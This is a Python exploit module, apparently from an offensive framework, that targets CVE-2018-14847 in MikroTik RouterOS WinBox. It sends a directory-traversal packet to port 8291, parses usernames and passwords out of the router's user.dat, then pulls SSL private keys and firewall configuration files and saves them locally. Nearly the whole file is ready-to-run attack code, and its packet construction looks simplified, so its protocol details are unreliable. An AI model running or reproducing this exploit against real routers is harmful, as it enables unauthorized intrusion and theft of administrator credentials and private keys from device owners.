#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MikroTik RouterOS WinBox Exploit
CVE-2018-14847
"""

import socket
import struct

MODULE_INFO = {
    "name": "MikroTik WinBox Credential Disclosure",
    "description": "Directory traversal vulnerability in MikroTik RouterOS WinBox interface leading to credential disclosure",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "linux",
    "rank": "Excellent",
    "references": [
        "CVE-2018-14847",
        "https://github.com/BasuCert/WinboxPoC"
    ],
    "dependencies": []
}

OPTIONS = {
    "RHOST": {
        "description": "Target router IP address",
        "required": True,
        "default": "192.168.88.1"
    },
    "RPORT": {
        "description": "Target WinBox port",
        "required": False,
        "default": "8291"
    },
    "TIMEOUT": {
        "description": "Connection timeout in seconds",
        "required": False,
        "default": "10"
    }
}

class MikroTikWinboxExploit:
    def __init__(self, target, port=8291, timeout=10):
        self.target = target
        self.port = port
        self.timeout = timeout
        
    def extract_file(self, file_path):
        """Extract file via directory traversal"""
        try:
            # Connect to WinBox service
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            
            # Build exploit packet
            packet = self.build_exploit_packet(file_path)
            
            # Send exploit
            sock.send(packet)
            
            # Receive response
            response = b""
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
                
            sock.close()
            
            return response
            
        except Exception as e:
            return None
    
    def build_exploit_packet(self, file_path):
        """Build WinBox exploit packet"""
        # WinBox protocol magic
        packet = b"\x00\x00\x00\x00"
        
        # Add file path for directory traversal
        traversal_path = f"../../../../../../../../../../../../../../{file_path}"
        
        # Build the request
        request = (
            b"\x01\x00\x00\x00"  # Version
            b"\x01\x00\x00\x00"  # Code
            b"\x00\x00\x00\x00"  # Session ID
            b"\x00\x00\x00\x00"  # Reply expected
            b"\x00\x00\x00\x00"  # Unknown
        )
        
        # Add file path
        path_encoded = traversal_path.encode('utf-8') + b"\x00"
        request += struct.pack("<I", len(path_encoded))
        request += path_encoded
        
        packet += struct.pack("<I", len(request))
        packet += request
        
        return packet
    
    def extract_credentials(self):
        """Extract user database"""
        try:
            # Try to extract user database
            users_data = self.extract_file("flash/rw/store/user.dat")
            if users_data:
                return self.parse_user_dat(users_data)
                
            return None
            
        except Exception as e:
            return None
    
    def parse_user_dat(self, data):
        """Parse user.dat file to extract credentials"""
        try:
            users = []
            
            # Simple parsing of user.dat format
            data_str = data.decode('latin-1')
            
            # Look for username patterns
            import re
            username_pattern = re.compile(r'name=([^\x00]+)')
            password_pattern = re.compile(r'password=([^\x00]+)')
            
            usernames = username_pattern.findall(data_str)
            passwords = password_pattern.findall(data_str)
            
            for i in range(min(len(usernames), len(passwords))):
                users.append({
                    'username': usernames[i],
                    'password': passwords[i]
                })
                
            return users
            
        except:
            return None

def display_exploit_info():
    """Display exploit information"""
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    
    console = Console()
    
    table = Table(show_header=True, header_style="bold red", box=None)
    table.add_column("Module", style="bold yellow")
    table.add_column("Details", style="white")
    
    table.add_row("Name", MODULE_INFO["name"])
    table.add_row("Module", "exploit/linux/router/mikrotik_winbox")
    table.add_row("Disclosure", "2018-04-23")
    table.add_row("Platform", MODULE_INFO["platform"])
    table.add_row("Rank", MODULE_INFO["rank"])
    
    console.print(Panel(table, title="Exploit Information", border_style="red"))
    
    # Affected devices
    affected_panel = Panel(
        "MikroTik RouterOS 6.29 - 6.42\n"
        "All devices running affected RouterOS versions",
        title="Affected Versions",
        border_style="yellow"
    )
    console.print(affected_panel)

def run(session, options):
    """Main exploit function"""
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    
    console = Console()
    
    # Display exploit info
    display_exploit_info()
    
    # Display options
    current_options = OPTIONS.copy()
    for key in current_options:
        if key in options:
            current_options[key]['value'] = options[key]
    
    table = Table(show_header=True, header_style="bold magenta", box=None)
    table.add_column("Name", style="bold cyan")
    table.add_column("Current Setting", style="green")
    table.add_column("Required", style="yellow")
    table.add_column("Description", style="white")
    
    for name, config in current_options.items():
        current = config.get('value', config.get('default', ''))
        required = "yes" if config.get('required', False) else "no"
        description = config.get('description', '')
        
        table.add_row(name, str(current), required, description)
    
    console.print(Panel(table, title="Module Options (exploit/linux/router/mikrotik_winbox)", border_style="blue"))
    
    # Get options
    rhost = options.get("RHOST", "192.168.88.1")
    rport = int(options.get("RPORT", "8291"))
    timeout = int(options.get("TIMEOUT", "10"))
    
    console.print(f"\n[bold yellow][*][/bold yellow] Target: [cyan]{rhost}:{rport}[/cyan]")
    
    try:
        # Initialize exploit
        exploit = MikroTikWinboxExploit(rhost, rport, timeout)
        
        console.print("\n[bold yellow][*][/bold yellow] Attempting to extract credentials...")
        credentials = exploit.extract_credentials()
        
        if credentials:
            console.print("[bold green][+][/bold green] Credentials extracted successfully!")
            
            # Display credentials table
            creds_table = Table(show_header=True, header_style="bold green", box=None)
            creds_table.add_column("Username", style="cyan")
            creds_table.add_column("Password", style="red")
            
            for cred in credentials:
                creds_table.add_row(cred['username'], cred['password'])
            
            console.print(Panel(creds_table, title="Extracted Credentials", border_style="green"))
            
            # Try to extract more files
            console.print("\n[bold yellow][*][/bold yellow] Attempting to extract additional files...")
            
            interesting_files = [
                "flash/rw/store/ssl.crt",
                "flash/rw/store/ssl.key", 
                "flash/rw/store/ip firewall filter.rsc",
                "flash/rw/store/ip firewall nat.rsc"
            ]
            
            for file_path in interesting_files:
                file_data = exploit.extract_file(file_path)
                if file_data and len(file_data) > 100:
                    filename = file_path.split('/')[-1]
                    with open(f"mikrotik_{filename}", 'wb') as f:
                        f.write(file_data)
                    console.print(f"[bold green][+][/bold green] Extracted: [cyan]{filename}[/cyan]")
                    
        else:
            console.print("[red][-][/red] Failed to extract credentials")
            
    except Exception as e:
        console.print(f"[red][-][/red] Exploit failed: {str(e)}")
